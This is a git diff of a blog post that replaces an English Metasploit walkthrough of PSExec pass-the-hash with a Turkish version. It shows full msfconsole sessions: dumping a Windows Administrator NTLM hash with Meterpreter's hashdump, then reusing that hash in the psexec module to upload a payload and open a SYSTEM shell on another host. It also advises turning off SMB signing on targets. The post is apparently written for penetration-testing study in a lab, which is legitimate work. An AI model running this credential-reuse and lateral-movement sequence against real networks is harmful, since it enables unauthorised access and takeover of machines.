@@ -5,7 +5,7 @@ date: 2017-05-25 09:01:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,28 +13,32 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework psexec
+- msf psexec
+
+excerpt: psexec modülü, genellikle pentest işlemleri esnasında kullanılır. Bu modül sayesine hedef sisteme giriş yapmanız mümkün hale gelmektedir. Alışılmış kullanımda, sistemin kullanıcı adı ve parolasını elde ettiğiniz ve bunu exploit modülüne değişken olarak girmeniz yeterlidir.
 ---
 
-PSExec Pass the Hash
-The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for. It was written by sysinternals and has been integrated within the framework. Often as penetration testers, we successfully gain access to a system through some exploit, use meterpreter to grab the passwords or other methods like fgdump, pwdump, or cachedump and then utilize rainbowtables to crack those hash values.
+psexec modülü, genellikle pentest işlemleri esnasında kullanılır. Bu modül sayesine hedef sisteme giriş yapmanız mümkün hale gelmektedir. Alışılmış kullanımda, sistemin kullanıcı adı ve parolasını elde ettiğiniz ve bunu exploit modülüne değişken olarak girmeniz yeterlidir. 
 
-We also have other options like pass the hash through tools like iam.exe. One great method with psexec in metasploit is it allows you to enter the password itself, or you can simply just specify the hash values, no need to crack to gain access to the system. Let’s think deeply about how we can utilize this attack to further penetrate a network. Lets first say we compromise a system that has an administrator password on the system, we don’t need to crack it because psexec allows us to utilize just the hash values, that administrator account is the same on every account within the domain infrastructure. We can now go from system to system without ever having to worry about cracking the password. One important thing to note on this is that if NTLM is only available (for example its a 15+ character password or through GPO they specify NTLM response only), simply replace the ****NOPASSWORD**** with 32 0’s for example:
+Normalde izlenen yol, sistemde meterpreter shell açıldığında ```fgdump```, ```pwdump``` veya ```cachedump``` komutlarıyla parola elde etmektir. Bu aramalar esnasında bulduğunuz ```hash``` değerleri olursa, bunları çeşitli araçlar kullanarak çözmeye ve parolaların açık halini elde etmeye çalışırız. 
 
-******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c
-Would be replaced by:
+Oysa bazen başka bir durumla karşı karşı kalabilirsiniz. Bir sistemde ```Administrator``` yetkili bir oturum açtınız ve kullanıcının ```hash``` olarak formatlı parolasını elde ettiniz. Bu oturum açtığınız sistem üzerinden aynı ağda bulunan başka bir sisteme bağlanmak istediğinizde, ```Administrator``` kullanıcısının parolasını çözmenize gerek olmayabilir. Genellikle ağdaki cihazlar bu ```hash``` değerleri kulanarak haberleşirler. psexec modülü, bulduğunuz ```hash``` değerini parola olarak kullanmanıza olanak sağlar.   
 
-00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
-While testing this in your lab, you may encounter the following error even though you are using the correct credentials:
+UYARI-1:
 
-STATUS_ACCESS_DENIED (Command=117 WordCount=0)
-This can be remedied by navigating to the registry key, “HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” on the target systems and setting the value of “RequireSecuritySignature” to “0”.
+> NTLM kullanan sistemde, bulacağınız ```hash``` değeri ```******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c``` formatındaysa, baş taraftaki ```******NOPASSWORD*******``` kısmını 32 adet sıfır ile değiştirerek ```psexec``` içine değişken olarak girmeniz gerekir. Yani değer, ```00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c``` şeklinde olmalıdır.
 
-[*] Meterpreter session 1 opened (192.168.57.139:443 -> 192.168.57.131:1042)
+UYARI-2:
+
+> Lab ortamında, doğru hash değeri girdiğiniz halde ```STATUS_ACCESS_DENIED (Command=117 WordCount=0)``` hatası alıyorsanız, hedef Windows sisteminin Registry ayarlarında ```HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters``` içerisinde ```RequireSecuritySignature``` değerini ```0``` olarak ayarlamalısınız.
+
+## Hashdump
+
+Aşağıda, bir exploit kullanılarak Meterpreter oturumu açılmıştır ve ```post/windows/gather/hashdump``` modülü ile sistemde hash değerleri bulunmak istenmektedir.
+
+```sh
+[*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1042)
 
 meterpreter > run post/windows/gather/hashdump 
 
@@ -46,8 +50,17 @@ meterpreter > run post/windows/gather/hashdump
 
 Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
 meterpreter >
-Now that we have a meterpreter console and dumped the hashes, lets connect to a different victim using PSExec and just the hash values.
+```
 
+Görüldüğü gibi, ```RHOST: 192.168.57.131``` IP adresinde bulunan Administrator kullanıcısına ait ```e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c``` değeri elde edilmiştir. 
+
+Şimdi bu hash değerini kullanarak ```RHOST: 192.168.57.140``` IP adresine oturum açmayı deneyelim. Tabii ki önceden yaptığınız taramada aynı ağda ```192.168.57.140``` IP adresinde ve ```445``` portunda ```SMB``` servisinin çalıştığını keşfettiğinizi kabul ediyoruz.
+
+## psexec
+
+Önce ```msfconsole``` ile Metasploit Framework başlatalım ve ```psexec``` modülünü yükleyelim.
+
+```sh
 root@kali:~# msfconsole
 
                 ##                          ###           ##    ##
@@ -81,15 +94,15 @@ msf exploit(psexec) > set LHOST 192.168.57.133
 LHOST => 192.168.57.133
 msf exploit(psexec) > set LPORT 443
 LPORT => 443
-msf exploit(psexec) > set RHOST 192.168.57.131
-RHOST => 192.168.57.131
+msf exploit(psexec) > set RHOST 192.168.57.140
+RHOST => 192.168.57.140
 msf exploit(psexec) > show options
 
 Module options:
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
-   RHOST    192.168.57.131   yes       The target address
+   RHOST    192.168.57.140   yes       The target address
    RPORT    445              yes       Set the SMB service port
    SMBPass                   no        The password for the specified username
    SMBUser  Administrator    yes       The username to authenticate as
@@ -109,8 +122,13 @@ Exploit target:
    Id  Name
    --  ----
    0   Automatic
+```
 
+## SMBPass
 
+Yukarıda görüldüğü gibi ```exploit/windows/smb/psexec``` modülünde ```SMBPass``` değişkenini girmemiz gerekmektedir. ```SMBPass``` değişkenine elimizde bulunan hash değerini girelim ve modülü ```exploit``` komutuyla çalıştıralım.
+
+```sh
 msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 msf exploit(psexec) > exploit
@@ -120,8 +138,8 @@ msf exploit(psexec) > exploit
 [*] Authenticating as user 'Administrator'...
 [*] Uploading payload...
 [*] Created \KoVCxCjx.exe...
-[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...
-[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...
+[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.140[\svcctl] ...
 [*] Obtaining a service manager handle...
 [*] Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...
 [*] Closing service handle...
@@ -131,7 +149,7 @@ msf exploit(psexec) > exploit
 [*] Closing service handle...
 [*] Deleting \KoVCxCjx.exe...
 [*] Sending stage (719360 bytes)
-[*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.131:1045)
+[*] Meterpreter session 1 opened (192.168.57.133:443 -> 192.168.57.140:445)
 
 meterpreter > shell
 Process 3680 created.
@@ -140,4 +158,6 @@ Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 
 C:\WINDOWS\system32>
-That is it! We successfully connect to a seperate computer with the same credentials without having to worry about rainbowtables or cracking the password. Special thanks to Chris Gates for the documentation on this.
+```
+
+Gördüğünüz gibi ```192.168.57.140``` IP adresinde oturum açılmıştır.
